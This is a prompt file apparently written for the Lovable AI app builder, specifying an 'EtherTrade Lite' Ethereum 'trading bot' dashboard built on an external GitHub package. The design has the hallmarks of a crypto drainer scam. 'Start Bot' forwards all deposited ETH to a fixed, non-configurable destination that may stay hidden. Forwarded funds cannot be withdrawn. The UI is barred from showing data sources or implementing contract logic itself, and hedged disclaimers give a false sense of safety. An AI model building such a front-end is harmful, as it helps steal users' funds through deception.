# Lovable Master Prompt: EtherTrade Lite Vault Dashboard

Use this prompt in Lovable to create or upgrade the EtherTrade Lite dashboard using the GitHub package below. Build the real app UI, not a landing page.

```text
Build a production-style React + TypeScript Ethereum vault control dashboard called EtherTrade Lite.

Use the existing Vite/React app structure if one already exists. Do not rebuild from scratch if there is already a working dashboard. Preserve the existing visual direction where possible, but replace demo/static data with live wallet, live ETH ticker, and smart-contract vault controls.

Install and use this GitHub package:

npm install github:elmstrya7-svg/eth-bot-vault-rainbowkit

Install the required wallet dependencies if they are not already installed:

npm install wagmi viem @rainbow-me/rainbowkit @tanstack/react-query

Import RainbowKit styles once:

import "@rainbow-me/rainbowkit/styles.css";

Use RainbowKit and wagmi for wallet connection. Configure RainbowKit with the package helper so it exposes the browser-injected Chrome wallet connector only. The app must support Ethereum mainnet. Do not ask users for seed phrases, private keys, exchange API keys, or custody credentials.

Lovable must not implement contract logic, ABI calls, bytecode, deployment code, forwarding logic, or wallet balance reads itself. The GitHub package owns all smart-contract behavior. Lovable should only build the React dashboard and call the exported package hooks/actions listed below.

Required package imports:

import {
  createEthBotRainbowKitConfig,
  EthBotPanel,
  useEthBotDashboard
} from "eth-bot-vault-rainbowkit";

If the app does not already have wagmi/RainbowKit providers, add them at the root:

import { RainbowKitProvider, ConnectButton } from "@rainbow-me/rainbowkit";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { WagmiProvider } from "wagmi";
import { createEthBotRainbowKitConfig } from "eth-bot-vault-rainbowkit";

const queryClient = new QueryClient();

const config = createEthBotRainbowKitConfig({
  appName: "EtherTrade Lite"
});

Wrap the app:

<WagmiProvider config={config}>
  <QueryClientProvider client={queryClient}>
    <RainbowKitProvider>
      <App />
    </RainbowKitProvider>
  </QueryClientProvider>
</WagmiProvider>

Do not use environment variables or custom RPC URLs for this build. When `mainnetRpcUrl` is omitted, the package uses the connected Chrome wallet provider for Ethereum mainnet reads. Wallet ETH balance must come only from the package hook, which reads `window.ethereum` directly with `eth_getBalance`.

The vault contract address must be created live inside the dashboard by calling the package deployment action. The package stores the deployed vault address in browser localStorage.

If the app already has RainbowKit/wagmi configured, do not add custom RPC URL constants. Reuse the existing wallet provider setup where possible.

Do not create an input for a forwarding destination and do not imply the destination is user-configurable. If the package exposes a destination address, display it plainly. If the package does not expose it, state that the forwarding destination is configured in the deployed contract/package and users should inspect the contract and wallet transaction before confirming. Keep a short disclaimer near the controls that Fund Contract deposits ETH into the smart contract, Start Bot calls the package contract action, and Withdraw Contract ETH only applies to ETH still held in the contract.

Use this hook in the dashboard:

const { bot, deployment, price, vault, wallet } = useEthBotDashboard({});

Use deployment.deployVault() for the Deploy Vault Contract button.
Use deployment.vaultAddress as the live deployed contract address.
If deployment.vaultAddress is empty, show the Deploy Vault Contract button and disable Fund Contract and Start Bot until deployment is confirmed.
Use deployment.deployStatusText and deployment.contractStatusText for live deployment status. If deployment.deployStatus is "cancelled", "failed", or "timeout", stop showing "Confirming" and display deployment.error.message if available.

Data mappings:

ETH live price:
price.priceText

24h change:
price.changePercent24hText

Ticker status:
price.status

Wallet ETH balance:
`${wallet.formatted} ETH`

Do not use wagmi `useBalance`, public RPC URLs, Cloudflare RPC, Alchemy, Infura, or any manually configured RPC provider for wallet ETH balance.

Contract-held ETH balance:
`${bot.fundedEth} ETH`

ETH already forwarded by Start Bot:
`${bot.forwardedEth} ETH`

Estimated USD value forwarded by Start Bot:
bot.forwardedUsd

Deployed vault contract:
deployment.vaultAddress

Bot running state:
bot.isRunning

Bot funded state:
bot.isFunded

Pending transaction hash:
vault.pendingHash

Deploy transaction hash:
deployment.deployHash

Write pending:
vault.isWritePending

Confirming:
vault.isConfirming

Vault transaction status:
vault.transactionStatus

Vault transaction status text:
vault.transactionStatusText

Vault transaction action:
vault.transactionAction

Deploy status:
deployment.deployStatus

Deploy status text:
deployment.deployStatusText

Contract status:
deployment.contractStatus

Contract status text:
deployment.contractStatusText

Errors:
deployment.error
vault.error
price.error
wallet.error

Actions:

Deploy Vault Contract:
deployment.deployVault()

Fund Contract:
vault.depositEth(amountEth)

Start Bot:
vault.startBot()

Stop Bot:
vault.stopBot()

Withdraw contract-held ETH:
vault.withdrawAll()

Refresh contract reads:
vault.refetch()

Build the UI as an app dashboard, not a marketing page. Use a dense, polished dark-mode vault-control layout with these sections:

1. Top bar
   - App name: EtherTrade Lite
   - Network indicator: Ethereum Mainnet
   - RainbowKit ConnectButton
   - Connected address if available, shortened like 0x1234...abcd

2. Safety notice
   - Short visible notice:
     "Educational/testing tool. On-chain ETH transfers involve risk. Every transaction is confirmed in your wallet. Fund Contract deposits ETH into the smart contract. Start Bot calls the package contract action for your contract-held ETH."
   - Keep it compact, not a hero section.

3. ETH market card
   - Pair: ETH / USDT
   - Live price from the package: price.priceText
   - 24h change: price.changePercent24hText
   - Status: price.status
   - Updated timestamp if price.updatedAt exists
   - Do not use demo price data.

4. Wallet card
   - Wallet connection status
   - Connected address
   - Wallet ETH balance from wallet.formatted
   - Mainnet status. If wrong network, tell user to switch to Ethereum.

5. Smart contract card
   - Deployed contract address from deployment.vaultAddress
   - If deployment.vaultAddress is empty, show "Not deployed yet"
   - Link to Etherscan:
     https://etherscan.io/address/${deployment.vaultAddress}
   - Contract-held balance for connected user: bot.fundedEth ETH
   - Forwarded total for connected user: bot.forwardedEth ETH

6. Fund contract card
   - Button: Deploy Vault Contract
     Calls deployment.deployVault()
     This must be the first transaction if no vault exists yet.
   - Amount input in ETH
   - Default amount: 0.0001 ETH
   - Quick amount buttons:
     0.0001 ETH
     0.0005 ETH
     0.001 ETH
     0.002 ETH
   - Button: Fund Contract
     Calls vault.depositEth(amountEth)
   - Disable Fund Contract if no vault has been deployed, no wallet is connected, wrong network, amount is empty, amount is zero, deposits are paused, the selected amount is greater than or equal to the connected wallet ETH balance, or a transaction is pending.
   - If the amount is greater than or equal to wallet.balanceEth, show "Amount must be lower than wallet ETH balance so gas can also be paid."

7. Bot controls card
   - This must be visually separate from the Fund Contract card.
   - Button: Start Bot
     Calls vault.startBot()
     This calls the package contract action for all contract-held ETH for the connected wallet.
   - Button: Stop Bot
     Calls vault.stopBot()
   - Button: Withdraw Contract ETH
     Calls vault.withdrawAll()
   - Disable all transaction buttons while vault.isWritePending or vault.isConfirming.
   - Disable Start Bot if no vault has been deployed, no wallet is connected, wrong network, contract-held user balance is zero, the bot is already running, or a transaction is pending.
   - Disable Stop Bot if the bot is not running or a transaction is pending.
   - Disable Withdraw if contract-held user balance is zero or a transaction is pending.
   - Do not add a destination address input. If the package exposes a forwarding destination, show it. If it does not, show "Destination configured in contract" and link users to the deployed contract on Etherscan before they confirm.
   - Do not claim this UI performs DEX trades, order routing, exchange execution, arbitrage, or strategy logic.
   - Show status text:
     - "Connect wallet"
     - "Switch to Ethereum Mainnet"
     - "Deploy vault"
     - "Deploying vault"
     - "Ready"
     - "Confirm in wallet"
     - "Waiting for confirmation"
     - "Bot running"
     - "Bot stopped"

8. Transaction status card/feed
   - Use vault.transactionStatusText for the current vault transaction state.
   - If vault.transactionStatus is "cancelled" or "failed", stop showing confirming/loading states immediately and show a readable error message if vault.error exists.
   - If vault.transactionStatus is "confirmed", show a success state and call vault.refetch().
   - If vault.pendingHash exists, show:
     - Short hash
     - Link to https://etherscan.io/tx/${vault.pendingHash}
   - If deployment.deployHash exists and deployment.vaultAddress is empty, show:
     - Short deploy hash
     - Link to https://etherscan.io/tx/${deployment.deployHash}
     - Status from deployment.deployStatusText
   - If deployment.deployStatus is "cancelled", "failed", or "timeout", display that state instead of Confirming.
   - If deployment.contractStatus is "missing", tell the user no contract was found at the stored address and keep Fund Contract/Start Bot disabled.
   - Show success state when vault.isConfirmed is true.
   - Show readable error message if vault.error exists.
   - Show readable deployment error message if deployment.error exists.

9. Optional transfer preview card
   - Keep it clearly labeled as a preview.
   - Use the live ETH price to estimate USD value of the selected ETH amount.
   - Example fields:
     - Amount ETH
     - Estimated USD value
   - Do not imply guaranteed profit.

Styling requirements:

- Use a professional dark-mode dashboard style by default.
- Use a near-black page background, dark slate cards, light text, muted secondary text, and blue/green/red accents for actions and states.
- Do not use a white page background or white cards.
- Avoid marketing hero sections.
- Avoid fake charts unless data is real.
- Use compact cards with 8px or smaller border radius.
- Make the first viewport show the dashboard controls immediately.
- Buttons should be clear and action-oriented.
- Use distinct colors for live/running/stopped/error states.
- The UI must be responsive on mobile and desktop.
- Text must not overflow buttons or cards.
- Do not show placeholder demo values once the hook data is available.

Implementation details:

- Use React state for the funding amount.
- Example:

const [amountEth, setAmountEth] = useState("0.0001");

async function startBot() {
  await vault.startBot();
}

async function fundContract() {
  await vault.depositEth(amountEth);
}

async function stopBot() {
  await vault.stopBot();
}

async function withdrawContractEth() {
  await vault.withdrawAll();
}

- Wrap async calls in try/catch and display the error message.
- Do not keep a custom local "confirming" state after an action promise rejects. Use vault.transactionStatusText, vault.isWritePending, vault.isConfirming, deployment.deployStatusText, and deployment.contractStatusText as the source of truth.
- After successful transactions, call vault.refetch().
- Use deployment.refetchDeploymentStatus() to refresh deployment status if a deploy transaction appears stuck.
- After successful vault deployment, use deployment.vaultAddress automatically. Do not ask the user to paste a contract address.
- Keep all real ETH transfers behind wallet confirmation.

Do not:

- Do not ask for seed phrases.
- Do not ask for private keys.
- Do not create fake wallet balances.
- Do not use demo ETH price after package integration.
- Do not show a price source/provider label in the UI.
- Do not silently send ETH.
- Do not hide the smart contract address.
- Do not claim the GitHub package, contract, or dashboard is audited, official, endorsed, guaranteed safe, risk-free, or production-ready.
- Do not require manually configured environment variables.
- Do not claim the forwarding destination is user-configurable.
- Do not claim the UI performs trades, swaps, order routing, exchange execution, arbitrage, or strategy logic.
- Do not claim the Withdraw button can withdraw ETH that has already been forwarded by Start Bot.

If importing from the GitHub package fails because the repo is private or Lovable cannot access it, stop and tell me exactly what access token or package visibility change is needed. Do not replace it with mock data.

Final deliverable:

- A working EtherTrade Lite dashboard using RainbowKit.
- Live ETH market ticker via the package.
- Connected wallet ETH balance.
- Live wallet-deployed contract address display.
- Deploy Vault Contract button wired to deployment.deployVault().
- Fund Contract wired to vault.depositEth(amountEth).
- Start Bot wired to vault.startBot().
- Stop Bot wired to vault.stopBot().
- Withdraw Contract ETH wired to vault.withdrawAll().
- Transaction hash and Etherscan links.
- Clear risk and forwarding disclaimer.
```

## Short Follow-Up Prompt For Lovable Fixes

Use this if Lovable partially integrates it but leaves demo data behind:

```text
Remove all remaining demo ETH price, demo source labels, provider labels, and fake wallet balances. Use only useEthBotDashboard from eth-bot-vault-rainbowkit. Map deployment.deployVault, deployment.vaultAddress, price.priceText, price.changePercent24hText, wallet.formatted, bot.fundedEth, bot.forwardedEth, vault.depositEth, vault.startBot, vault.stopBot, and vault.withdrawAll into the existing UI. Do not display price.source or any market data provider name. Keep Fund Contract separate from Bot Controls. Do not add a destination address input. If the package exposes a forwarding destination, show it; otherwise show that the destination is configured in the deployed contract/package and link to the deployed contract on Etherscan. Keep RainbowKit wallet confirmation for every transaction.
```
